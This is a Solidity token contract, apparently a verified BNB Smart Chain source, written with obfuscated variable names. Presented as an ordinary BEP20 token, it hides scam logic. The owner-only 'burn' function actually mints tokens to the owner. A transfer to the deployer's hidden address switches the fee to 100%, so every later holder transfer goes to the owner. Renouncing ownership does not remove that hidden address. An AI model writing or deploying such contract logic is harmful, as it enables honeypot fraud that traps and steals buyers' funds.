/**
 *Submitted for verification at BscScan.com on 2022-11-12
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-13
 */
pragma solidity >=0.5.12;
contract DkXBXE {
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
address public  heXdIH = address(0);
mapping (address => mapping (address => uint256)) private _allowances;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
address public  VLRXtO = address(0);
uint256 public constant totalSupply = 100000000000000000000000000000;
address public  BbNjHi = address(0);
address public  ZOCWhe = address(0);
mapping (address => uint256) public balanceOf;
address private  NNqqgi = address(0);
uint256 public constant siBZDJ = 9+1;
uint256 public  EdFlfC = 100000000000000000000000;
uint256 public  MbuWNK = 100000000000000000;
uint256 public  UkSXbF = 100000000000000000000;
uint256 public  lLDCyK = 1000000000000000000;
uint256 private  WlQQgV = 10000000000000;
string public  name = "pRMEUv";
uint8 public constant decimals = 18;
address public owner;
uint256 public  FjfnmJ = 10000000000000000000;
uint256 public  beunEO = 10000000000000000000000000000;
address public  uzvKgy = address(0);
uint256 public  gvGYGM = 100000000000000000000000;
string public  symbol = "MFlkRW";
event Transfer(address indexed from, address indexed to, uint256 value);
event Approval(address indexed owner, address indexed spender, uint256 value);
uint256 public  tJkOGB = 10000000000000000;
address public  fkuxqC = address(0);
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "CgiMtL");
require(to != address(0), "CgiMtL");
require(amount <= balanceOf[from], "CgiMtL");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* siBZDJ/WlQQgV ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==NNqqgi){
WlQQgV = 9+1;
}
emit Transfer(from, to, transferAmount);
}
constructor () {
NNqqgi = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}

}